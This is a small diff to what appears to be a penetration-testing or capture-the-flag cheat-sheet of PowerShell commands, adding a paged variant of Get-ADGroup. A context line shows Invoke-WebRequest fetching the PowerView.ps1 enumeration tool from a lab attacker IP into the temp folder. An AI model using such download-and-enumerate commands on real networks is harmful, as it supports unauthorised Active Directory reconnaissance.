@@ -9,6 +9,9 @@ Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:te
 List all AD-Groups
 ```
 Get-ADGroup -filter *
+
+Paging - more - equi
+Get-ADGroup -filter * | out-host -paging
 ```
 CyberChef
 ```
